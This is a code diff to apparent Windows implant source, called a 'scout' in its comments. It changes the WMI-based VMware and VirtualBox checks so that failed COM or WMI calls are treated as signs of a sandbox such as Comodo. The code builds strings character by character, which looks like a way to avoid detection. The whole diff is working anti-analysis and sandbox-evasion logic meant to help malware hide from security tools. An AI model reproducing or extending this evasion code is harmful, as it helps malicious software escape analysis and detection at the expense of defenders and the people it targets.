@@ -58,9 +58,9 @@ BOOL AntiVMWare()
 
 	CoInitialize(NULL);
 	if (CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID *)&pLoc) != S_OK)
-		return FALSE;
+		return TRUE; //if the call fails, we suppose the scout is running in a sandbox (ex: comodo)
 	if (!pLoc)
-		return FALSE;
+		return TRUE; //if the call fails, we suppose the scout is running in a sandbox (ex: comodo)
 
 	WCHAR strRootCIM[] = { L'R', L'O', L'O', L'T', L'\\', L'C', L'I', L'M', L'V', L'2', L'\0' };
 	BSTR bRootCIM = SysAllocString(strRootCIM);
@@ -121,6 +121,10 @@ BOOL AntiVMWare()
 			VariantClear(&vArg);
 		}
 	}
+	else
+	{
+		bVMWareFound = TRUE; //if the call fails, we suppose the scout is running in a sandbox (ex: comodo)
+	}
 
 	if(pSvc)
 		pSvc->Release();
@@ -144,14 +148,14 @@ BOOL AntiVBox()
 
 	CoInitialize(NULL);
 	if (CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID *)&pLoc) != S_OK)
-		return FALSE;
+		return TRUE; //if the call fails, we suppose the scout is running in a sandbox (ex: comodo)
 	if (!pLoc)
-		return FALSE;
+		return TRUE; //if the call fails, we suppose the scout is running in a sandbox (ex: comodo)
 
 	WCHAR strRootCIM[] = { L'R', L'O', L'O', L'T', L'\\', L'C', L'I', L'M', L'V', L'2', L'\0' };
 	BSTR bRootCIM = SysAllocString(strRootCIM);
 
-	if (pLoc->ConnectServer(bRootCIM, NULL, NULL, 0, NULL, 0, 0, &pSvc) == WBEM_S_NO_ERROR) 
+	if (pLoc->ConnectServer(bRootCIM, NULL, NULL, 0, NULL, 0, 0, &pSvc) == WBEM_S_NO_ERROR)
 	{
 		if (CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE) == S_OK)
 		{
@@ -164,6 +168,10 @@ BOOL AntiVBox()
 				bVBoxFound = TRUE;
 			VariantClear(&vArg);
 		}
+	}
+	else
+	{
+		bVBoxFound = TRUE; //if the call fails, we suppose the scout is running in a sandbox (ex: comodo)
 	}
 
 	if(pSvc)
